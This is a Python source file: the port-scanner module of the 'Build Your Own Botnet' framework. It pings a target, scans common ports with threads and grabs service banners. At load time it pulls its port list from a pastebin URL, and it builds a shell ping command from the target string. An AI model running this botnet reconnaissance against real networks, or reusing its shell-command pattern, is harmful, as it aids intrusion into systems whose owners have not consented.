#!/usr/bin/python
# -*- coding: utf-8 -*-
'Port Scanner (Build Your Own Botnet)'

# standard libarary
import os
import json
import Queue
import socket
import urllib
import subprocess

# utilities
import util

# globals
packages = []
platforms = ['win32','linux2','darwin']
results = {}
threads = {}
targets = []
ports = json.loads(urllib.urlopen('https://pastebin.com/raw/WxK7eUSd').read())
tasks = Queue.Queue()
usage = 'portscanner [target]'
desciription = """
Scan a target IP/subnet for open ports and grab any service banners
"""

# main
def _ping(host):
    global results
    try:
        if host not in results:
            if subprocess.call("ping -{} 1 -W 90 {}".format('n' if os.name == 'nt' else 'c', host), 0, None, subprocess.PIPE, subprocess.PIPE, subprocess.PIPE, shell=True) == 0:
                results[host] = {}
                return True
            else:
                return False
        else:
            return True
    except Exception as e:
        util.log(str(e))
        return False

@util.threaded
def _threader():
    while True:
        global tasks
        try:
            method, task = tasks.get_nowait()
            if callable(method):
                _ = method(task)
            tasks.task_done()
        except:
            break

def _scan(target):
    global ports
    global results
    try:
        host, port = target
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(1.0)
        sock.connect((str(host), int(port)))
        data = sock.recv(1024)
        sock.close()
        if data:
            data = ''.join([i for i in data if i in ([chr(n) for n in range(32, 123)])])
            data = data.splitlines()[0] if '\n' in data else str(data if len(str(data)) <= 80 else data[:77] + '...')
            item = {str(port) : {'protocol': ports[str(port)]['protocol'], 'service': data, 'state': 'open'}}
        else:
            item = {str(port) : {'protocol': ports[str(port)]['protocol'], 'service': ports[str(port)]['service'], 'state': 'open'}}
        results.get(host).update(item)
    except (socket.error, socket.timeout):
        pass
    except Exception as e:
        util.log("{} error: {}".format(_scan.func_name, str(e)))

def run(target='192.168.1.1', ports=[21,22,23,25,80,110,111,135,139,443,445,554,993,995,1433,1434,3306,3389,8000,8008,8080,8888]):
    """
    Run a portscan against a target hostname/IP address

    `Optional`
    :param str target: Valid IPv4 address
    :param list ports: Port numbers to scan on target host
    :returns: Results in a nested dictionary object in JSON format

    Returns onlne targets & open ports as key-value pairs in dictionary (JSON) object

    """
    global tasks
    global threads
    global results
    if not util.ipv4(target):
        raise ValueError("target is not a valid IPv4 address")
    if _ping(target):
        for port in ports:
            tasks.put_nowait((_scan, (target, port)))
        for i in range(1, tasks.qsize()):
            threads['portscan-%d' % i] = _threader()
        for t in threads:
            threads[t].join()
        return json.dumps(results[target])
    else:
        return "Target offline"
